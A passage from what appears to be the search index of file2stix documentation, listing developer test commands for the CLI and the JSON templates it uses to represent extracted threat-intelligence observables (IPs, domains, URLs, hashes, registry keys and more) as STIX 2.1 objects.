CountryCodeAlpha2Observable,\\ CountryCodeAlpha3Observable,\\ MastercardCreditCardObservable,\\ VisaCreditCardObservable,\\ AmexCreditCardObservable,\\ UnionPayCreditCardObservable,\\ DinersCreditCardObservable,\\ JCBCreditCardObservable,\\ IBANCodeObservable,\\ YaraRuleObservable,\\ CPEObservable,\\ CVEObservable,\\ MITREEnterpriseAttackObservable,\\ MITREMobileAttackObservable,\\ MITREICSAttackObservable,\\ MITRECapecObservable,\\ CustomObservable","title":"Ignore IPv4 and Url"},{"location":"developers/#testing-adding-custom-identity","text":"","title":"Testing adding custom identity"},{"location":"developers/#valid-identity","text":"file2stix --input-file tests/observable_tests/ipv4.txt --user-identity-file tests/stix_templates/custom_identity_good.yml","title":"Valid identity"},{"location":"developers/#invalid-identity","text":"file2stix --input-file tests/observable_tests/ipv4.txt --user-identity-file tests/stix_templates/custom_identity_good.yml --tlp-level GREEN","title":"Invalid identity"},{"location":"developers/#testing-backends","text":"","title":"Testing backends"},{"location":"developers/#valid-arangodb-backend","text":"file2stix --input-file tests/observable_tests/ipv4.txt --backend tests/backends/arangodb.yml","title":"Valid arangodb backend"},{"location":"developers/#testing-alternative-bundle-directory","text":"file2stix --input-file tests/observable_tests/ipv4.txt --output-json-file stix2_bundles_alt","title":"Testing alternative bundle directory"},{"location":"developers/#testing-confidence","text":"","title":"Testing confidence"},{"location":"developers/#tlp-green","text":"file2stix --input-file tests/observable_tests/ipv4.txt --tlp-level GREEN --confidence 100","title":"TLP Green"},{"location":"developers/#tlp-amber","text":"file2stix --input-file tests/observable_tests/ipv4.txt --tlp-level AMBER --confidence 100","title":"TLP Amber"},{"location":"developers/#tlp-red","text":"file2stix --input-file tests/observable_tests/ipv4.txt --tlp-level RED --confidence 100","title":"TLP Red"},{"location":"developers/#tlp-white-warning","text":"file2stix --input-file tests/observable_tests/ipv4.txt --confidence 100 Should process the file, but throw a warning that it won't include confidence scores in CLI","title":"TLP White Warning"},{"location":"developers/#testing-reuse-of-stix-object","text":"The following test use the same single observble in test_a.txt ( 198.51.100.3 ) The following commands should all create a different id property for the Indicator Observable 198.51.100.3","title":"Testing reuse of STIX Object"},{"location":"developers/#10","text":"file2stix --input-file tests/extraction_tests/test_a.txt --tlp-level GREEN ```` #### 1.1 ```shell file2stix --input-file tests/extraction_tests/test_a.txt --confidence 100 --user-identity-file tests/stix_templates/custom_identity_good.yml --tlp-level GREEN --no-branding --defang-observables --misp-custom-warning-list-file tests/warning_lists/custom_list.json New indicator SDO New ipv4 SCO","title":"1.0"},{"location":"developers/#12","text":"Change confidence file2stix --input-file tests/extraction_tests/test_a.txt --confidence 90 --user-identity-file tests/stix_templates/custom_identity_good.yml --tlp-level GREEN --no-branding --defang-observables --misp-custom-warning-list-file tests/warning_lists/custom_list.json New indicator SDO Same ipv4 SCO as 1.1","title":"1.2"},{"location":"developers/#13","text":"Change user identity file2stix --input-file tests/extraction_tests/test_a.txt --confidence 100 --user-identity-file tests/stix_templates/custom_identity_good2.yml --tlp-level GREEN --no-branding --defang-observables --misp-custom-warning-list-file tests/warning_lists/custom_list.json New indicator SDO Same ipv4 SCO as 1.1","title":"1.3"},{"location":"developers/#14","text":"Change TLP file2stix --input-file tests/extraction_tests/test_a.txt --confidence 100 --user-identity-file tests/stix_templates/custom_identity_good.yml --tlp-level AMBER --no-branding --defang-observables --misp-custom-warning-list-file tests/warning_lists/custom_list.json New indicator SDO New ipv4 SCO","title":"1.4"},{"location":"developers/#15","text":"Change branding file2stix --input-file tests/extraction_tests/test_a.txt --confidence 90 --user-identity-file tests/stix_templates/custom_identity_good.yml --tlp-level GREEN --defang-observables --misp-custom-warning-list-file tests/warning_lists/custom_list.json New indicator SDO Same ipv4 SCO as 1.1","title":"1.5"},{"location":"developers/#16","text":"Change defang file2stix --input-file tests/extraction_tests/test_a.txt --confidence 100 --user-identity-file tests/stix_templates/custom_identity_good.yml --tlp-level GREEN --no-branding --misp-custom-warning-list-file tests/warning_lists/custom_list.json New indicator SDO New ipv4 SCO file2stix --input-file tests/extraction_tests/test_b.txt --confidence 100 --user-identity-file tests/stix_templates/custom_identity_good.yml --tlp-level GREEN --no-branding --defang-observables --misp-custom-warning-list-file tests/warning_lists/custom_list.json Same indicator SDO (1.6) Same ipv4 SCO (1.6)","title":"1.6"},{"location":"developers/#17","text":"Change MISP Warning List file2stix --input-file tests/extraction_tests/test_a.txt --confidence 100 --user-identity-file tests/stix_templates/custom_identity_good.yml --tlp-level GREEN --no-branding New indicator SDO Same ipv4 SCO as 1.1","title":"1.7"},{"location":"developers/#testing-custom-defintions-for-scos","text":"","title":"Testing custom defintions for SCOs"},{"location":"developers/#cryptocurrency-sco","text":"file2stix --input-file tests/observable_tests/crypto_btc.txt","title":"Cryptocurrency SCO"},{"location":"developers/#credit-card-sco","text":"file2stix --input-file tests/observable_tests/credit_card_mastercard.txt","title":"Credit Card SCO"},{"location":"developers/#asn-sco","text":"file2stix --input-file tests/observable_tests/asn.txt","title":"ASN SCO"},{"location":"developers/#bank-account-sco","text":"file2stix --input-file tests/observable_tests/iban.txt","title":"Bank account SCO"},{"location":"developers/#user-agent-sco","text":"file2stix --input-file tests/observable_tests/user_agent.txt","title":"User Agent SCO"},{"location":"developers/#cpe-properties-software-sco","text":"file2stix --input-file tests/observable_tests/cpe.txt","title":"CPE Properties (Software SCO)"},{"location":"developers/#testing-custom-defintions-for-sdos","text":"","title":"Testing custom defintions for SDOs"},{"location":"developers/#misp-warning-lists-properties-indicator-sdo","text":"file2stix --input-file tests/warning_lists/default_list_matches-string.txt file2stix --input-file tests/warning_lists/custom_list_matches.txt --misp-custom-warning-list-file tests/warning_lists/custom_list.json --tlp-level GREEN","title":"MISP Warning Lists Properties (Indicator SDO)"},{"location":"developers/#sigma-rule-properties-indicator-sdo","text":"file2stix --input-file tests/observable_tests/sigma_rule.txt","title":"Sigma Rule Properties (Indicator SDO)"},{"location":"developers/#cve-properties-vulnerability-sco","text":"file2stix --input-file tests/observable_tests/cve.txt","title":"CVE Properties (Vulnerability SCO)"},{"location":"extractions-analysis-mode/","text":"Extractions: Analysis Mode \u00b6 Analysis mode creates generic STIX 2.1 representing threat intel. It is recommended this mode is used when inputting generic threat intel into file2stix (rather than organisational specific observed intelligence). SCO creation logic \u00b6 Note, SCOs are created from Patterns in SDOs. e.g. [ipv4-addr:value='1.1.1.1'] become an SCO of \"type\": \"ipv4-addr with a \"value\": \"1.1.1.1\" This is done by pattern2sco: https://github.com/signalscorps/pattern2sco 1.1 IPv4 Address Observables without port ( indicator ) \u00b6 e.g. 198.51.100.3 e.g. 198.51.100.0/24 (with CIDR) Lots of IPv4 extraction logic exists on the internet ( for example ). IPv4 Address Observables are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX IPv4 Address SCO ( \"type\": \"ipv4-addr\" ) to create the Indicator SDO pattern property. Here is how ipv4 observables are represented in STIX 2.1 by file2stix; STIX 2.1 indicator SDO \u00b6 { \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"ipv4: <EXTRACTED IPV4 OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ ipv4-addr:value = '<EXTRACTED IPV4 OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] } STIX 2.1 ipv4-addr SCO \u00b6 { \"type\": \"ipv4-addr\", \"spec_version\": \"2.1\", \"id\": \"ipv4-addr--<GENERATED BY STIX2 LIBRARY>\", \"value\": \"<EXTRACTED IPV4 OBSERVABLE VALUE>\", \"defanged\": \"<DEFANGED BOOLEAN>\" } 1.2 IPv4 Address Observables with port ( indicator ) \u00b6 e.g. 198.51.100.0:80 (with port) Note for ipv4 and port observables, the representation is slightly different. When an IPv4 and port is detected (e.g. 1.1.1.1:80 ) and Indicator SDO with the following structure is created: STIX 2.1 indicator SDO \u00b6 { \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"ipv4: <EXTRACTED IPV4 OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ ipv4-addr:value = '<EXTRACTED IPV4 OBSERVABLE VALUE>' AND network-traffic:dst_port = '<EXTRACTED IPV4 PORT VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] } STIX 2.1 ipv4-addr and network-traffic SCO \u00b6 { \"type\": \"ipv4-addr\", \"spec_version\": \"2.1\", \"id\": \"ipv4-addr--<GENERATED BY STIX2 LIBRARY>\", \"value\": \"<EXTRACTED IPV4 OBSERVABLE VALUE>\", \"defanged\": \"<DEFANGED BOOLEAN>\" } { \"type\": \"network-traffic\", \"spec_version\": \"2.1\", \"id\": \"network-traffic--<GENERATED BY STIX2 LIBRARY>\", \"dst_ref\": \"ipv4-addr--<IPV4 OBJECT ID>\", \"dst_port\": \"<EXTRACTED IPV4 PORT VALUE>\", \"protocols\": [ \"ipv4\" ] } 2.1 IPv6 Observables without port ( indicator ) \u00b6 e.g. 2001:0db8:85a3:0000:0000:8a2e:0370:7334 e.g. 2002::abcd:ffff:c0a8:101/64 Lots of IPv4 extraction logic exists on the internet ( for example ). IPv6 Observables are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX IPv6 Address SCO ( \"type\": \"ipv6-addr\" ) to create the Indicator SDO pattern property. Here is how ipv6 observables are represented in STIX 2.1 by file2stix; STIX 2.1 indicator SDO \u00b6 { \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"ipv6: <EXTRACTED IPV6 OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ ipv6-addr:value = '<EXTRACTED IPV6 OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] } STIX 2.1 ipv6-addr SCO \u00b6 { \"type\": \"ipv6-addr\", \"spec_version\": \"2.1\", \"id\": \"ipv4-addr--<GENERATED BY STIX2 LIBRARY>\", \"value\": \"<EXTRACTED IPV6 OBSERVABLE VALUE>\", \"defanged\": \"<DEFANGED BOOLEAN>\" } 2.2 IPv6 Observables with port ( indicator ) \u00b6 e.g. [2001:0db8:85a3:0000:0000:8a2e:0370:7334]:80 Note for ipv6 and port observables, the representation is slightly different. When an IPv6 and port is detected (e.g. [2001:0db8:85a3:0000:0000:8a2e:0370:7334]:80 ) and Indicator SDO with the following structure is created: STIX 2.1 indicator SDO \u00b6 { \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"ipv6: <EXTRACTED IPV6 OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ ipv6-addr:value = '<EXTRACTED IPV6 OBSERVABLE VALUE WITH [] REMOVED>' AND network-traffic:dst_port = '<EXTRACTED IPV6 PORT VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] } STIX 2.1 ipv6-addr and network-traffic SCO \u00b6 { \"type\": \"ipv6-addr\", \"spec_version\": \"2.1\", \"id\": \"ipv4-addr--<GENERATED BY STIX2 LIBRARY>\", \"value\": \"<EXTRACTED IPV6 OBSERVABLE VALUE>\", \"defanged\": \"<DEFANGED BOOLEAN>\" } { \"type\": \"network-traffic\", \"spec_version\": \"2.1\", \"id\": \"network-traffic--<GENERATED BY STIX2 LIBRARY>\", \"dst_ref\": \"ipv4-addr--<IPV6 OBJECT ID>\", \"dst_port\": \"<EXTRACTED IPV6 PORT VALUE>\", \"protocols\": [ \"ipv6\" ] } 3. Domain Name Observables ( indicator ) \u00b6 e.g. domain example.com e.g. sub domain test.example.com Lots of domain extraction logic exists on the internet ( for example ). It is generally a good idea to also use a dictionary to validate the top level domain to ensure it is a domain (and not a file extension). Lots of TLD dictionaries exist to do this , although ensuring they are current can be a challenge. Domain Name Observables are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX Domain Name SCO ( \"type\": \"domain-name\" ) to create the Indicator SDO pattern property. Here is how domain name observables are represented in STIX 2.1 by file2stix; STIX 2.1 indicator SDO \u00b6 { \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"Domain: <EXTRACTED DOMAIN NAME OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ domain-name:value = '<EXTRACTED DOMAIN NAME OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] } STIX 2.1 domain-name SCO \u00b6 { \"type\": \"domain-name\", \"spec_version\": \"2.1\", \"id\": \"domain-name--<GENERATED BY STIX2 LIBRARY>\", \"value\": \"<EXTRACTED DOMAIN NAME VALUE>\", \"defanged\": \"<DEFANGED BOOLEAN>\" } 4. URL Observables ( indicator ) \u00b6 e.g. Full path https://example.com/research/index.html e.g. Partial path https://example.com/research/ Lots of URL extraction logic exists on the internet ( for example ). Like with URLs, it is also worth validating protocol and TLDs in the URL path to ensure they are URLs (and not file paths). URL Observables are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX URL SCO ( \"type\": \"url\" ) to create the Indicator SDO pattern property. Here is how URL observables are represented in STIX 2.1 by file2stix; STIX 2.1 indicator SDO \u00b6 { \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"URL: <EXTRACTED URL OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ url:value = '<EXTRACTED URL OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] } STIX 2.1 url SCO \u00b6 { \"type\": \"url\", \"spec_version\": \"2.1\", \"id\": \"url--<GENERATED BY STIX2 LIBRARY>\", \"value\": \"<EXTRACTED URL VALUE>\", \"defanged\": \"<DEFANGED BOOLEAN>\" } 5. File Name Observables ( indicator ) \u00b6 e.g. badfile.exe The extraction for file extensions requires some dictionary definitions (because filenames can easily be confused with domains in pattern matching). Here is a comprehensive list of file extensions that can be used . File Name Observables are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX File SCO ( \"type\": \"file\" ) to create the Indicator SDO pattern property. Here is how file names are represented in STIX 2.1 by file2stix; STIX 2.1 indicator SDO \u00b6 { \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"File name: <EXTRACTED FILE NAME OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ file:name = '<EXTRACTED FILE NAME OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] } STIX 2.1 file SCO \u00b6 { \"type\": \"file\", \"spec_version\": \"2.1\", \"id\": \"file--<GENERATED BY STIX2 LIBRARY>\", \"name\": \"<EXTRACTED FILE NAME VALUE>\", \"defanged\": \"<DEFANGED BOOLEAN>\" } 6. Directory Path Observables ( indicator ) \u00b6 e.g. Windows Path C:\\Windows\\System32 e.g. UNIX Path /System/Library/LaunchDaemons Windows paths start with a drive followed by :\\ and directories in path are split by \\ . UNIX Paths start with / and directories in path are split by / . Directory Path Observables are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX Directory SCO ( \"type\": \"directory\" ) to create the Indicator SDO pattern property. Here is how directory observables are represented in STIX 2.1 by file2stix; STIX 2.1 indicator SDO \u00b6 { \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"Directory: <EXTRACTED DIRECTORY OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ directory:path = '<EXTRACTED DIRECTORY OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] } STIX 2.1 directory SCO \u00b6 { \"type\": \"directory\", \"spec_version\": \"2.1\", \"id\": \"directory--<GENERATED BY STIX2 LIBRARY>\", \"path\": \"<EXTRACTED DIRECTORY OBSERVABLE VALUE>\" } 7. File Hashes ( indicator ) \u00b6 e.g. md5 79054025255fb1a26e4bc422aef54eb4 e.g. sha1 `86F7E437FAA5A7FCE15D1DDCB9EAEAEA377667B8 e.g. sha256 F4BF9F7FCBEDABA0392F108C59D8F4A38B3838EFB64877380171B54475C2ADE8 e.g. sha512 1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75 e.g ssdeep 24:Ol9rFBzwjx5ZKvBF+bi8RuM4Pp6rG5Yg+q8wIXhMC:qrFBzKx5s8sM4grq8wIXht Lots of hash extraction logic exists on the internet ( for example ). These are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX File SCO ( \"type\": \"file\" ) to create the Indicator SDO pattern property. Here is how file hashes are represented in STIX 2.1 by file2stix (note, <FILE HASH TYPE> = either md5 , sha1 , sha256 , ssdeep ); STIX 2.1 indicator SDO \u00b6 { \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"<FILE HASH TYPE>: <EXTRACTED FILE HASH OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ file:hashes.<FILE HASH TYPE> = '<EXTRACTED FILE HASH OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] } STIX 2.1 file SCO \u00b6 { \"type\": \"file\", \"spec_version\": \"2.1\", \"id\": \"file--<GENERATED BY STIX2 LIBRARY>\", \"hashes\": { \"<FILE HASH TYPE>\": \"<EXTRACTED FILE HASH OBSERVABLE VALUE>\" } } 8. Email Address Observables ( indicator ) \u00b6 e.g. Full email address example@example.com Lots of email extraction logic exists on the internet ( for example ). Like with URLs, it is also worth validating TLDs in the email to ensure they are valid. Email Address Observables are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX Email Address SCO ( \"type\": \"email-addr\" ) to create the Indicator SDO pattern property. Here is how email address observables are represented in STIX 2.1 by file2stix; STIX 2.1 indicator SDO \u00b6 { \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"Email Address: <EXTRACTED EMAIL ADDRESS OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ email-addr:value = '<EXTRACTED EMAIL ADDRESS OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] } STIX 2.1 file SCO \u00b6 { \"type\": \"email-addr\", \"spec_version\": \"2.1\", \"id\": \"email-addr--<GENERATED BY STIX2 LIBRARY>\", \"value\": \"<EXTRACTED EMAIL ADDRESS OBSERVABLE VALUE>\", \"defanged\": \"<DEFANGED BOOLEAN>\" } 9. MAC Address Observables ( indicator ) \u00b6 e.g. Full MAC address d2:fb:49:24:37:18 Mac Addresses have six parts, split by : . Lots of MAC address extraction logic exists on the internet ( for example ). Full MAC addresses are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX MAC Address SCO ( \"type\": \"mac-addr\" ) to create the Indicator SDO pattern property. Here is how MAC Address observables are represented in STIX 2.1 by file2stix; STIX 2.1 indicator SDO \u00b6 { \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"MAC Address: <EXTRACTED MAC ADDRESS OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ mac-addr:value = '<EXTRACTED MAC ADDRESS OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] } STIX 2.1 mac-addr SCO \u00b6 { \"type\": \"mac-addr\", \"spec_version\": \"2.1\", \"id\": \"mac-addr--<GENERATED BY STIX2 LIBRARY>\", \"value\": \"<EXTRACTED MAC ADDRESS OBSERVABLE VALUE>\" } 10. Windows Registry Key Observables ( indicator ) \u00b6 e.g. Full registry key path HKEY_LOCAL_MACHINE\\Software\\Classes There are 5 types of registry key HKEY_CLASSES_ROOT , HKEY_CURRENT_USER , HKEY_LOCAL_MACHINE , HKEY_USERS , HKEY_CURRENT_CONFIG . These are then followed by a directory path with directories separated by \\ . Windows Registry Keys are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX MAC Address SCO ( \"type\": \"windows-registry-key\" ) to create the Indicator SDO pattern property. Here is how Windows Registry Key observables are represented in STIX 2.1 by file2stix; STIX 2.1 indicator SDO \u00b6 { \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"Windows Registry Key: <EXTRACTED WINDOWS REGISTRY KEY OBSERVABLE VALUE>\", \"pattern_type\": \"stix\", \"pattern\": \"[ windows-registry-key:key = '<EXTRACTED WINDOWS REGISTRY KEY OBSERVABLE VALUE>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] } STIX 2.1 windows-registry-key SCO \u00b6 { \"type\": \"windows-registry-key\", \"spec_version\": \"2.1\", \"id\": \"windows-registry-key--<GENERATED BY STIX2 LIBRARY>\", \"key\": \"<EXTRACTED WINDOWS REGISTRY KEY OBSERVABLE VALUE>\" } 11. User Agent Observables ( indicator ) \u00b6 e.g Full user agent Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.6) Gecko/20040113 ) User Agents should follow RFC7231 . There are a few example regular expressions on the internet to extract user agent patterns . User Agents are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX Network Traffic SCO ( \"type\": \"network-traffic\" ) to create the Indicator SDO pattern property. Here is how User Agent observables are represented in STIX 2.1 by file2stix; STIX 2.1 extension-definition \u00b6 As STIX 2.1 does not natively have an extension for user agents file2stix uses a custom SCO; https://github.com/signalscorps/stix2-objects/blob/main/extension-definition/new-sco/user-agent/extension-definition--6cea4dc9-9517-44b8-b021-ae82e2f1de43/20220101000000000.json STIX 2.1 user-agent SCO \u00b6 { \"type\": \"user-agent\", \"spec_version\": \"2.1\", \"id\": \"user-agent--<GENERATED BY STIX2 LIBRARY>\", \"string\": \"<EXTRACTED FULL USER AGENT STRING>\", \"extensions\": { \"extension-definition--6cea4dc9-9517-44b8-b021-ae82e2f1de43\" : { \"extension_type\" : \"new-sco\" } } } STIX 2.1 indicator SDO \u00b6 { \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"User Agent: <EXTRACTED FULL USER AGENT STRING>\", \"pattern_type\": \"stix\", \"pattern\": \"[ user-agent:string = '<EXTRACTED FULL USER AGENT STRING>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] } 12. Autonomous System Number Observables ( indicator ) \u00b6 Including: e.g. ASN Number format ASN15139 / ASN 15139 e.g. AS Number format AS15139 / AS 15139 ASN numbers start with either ASN or AS and are followed by 5 digits. Occasionally some people write ASN numbers with a white space value between the text and digits. ASNs are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) , using the STIX AS Object SCO ( \"type\": \"autonomous-system\" ) to create the Indicator SDO pattern property. Here is how AS observables are represented in STIX 2.1 by file2stix; STIX 2.1 indicator SDO \u00b6 { \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER 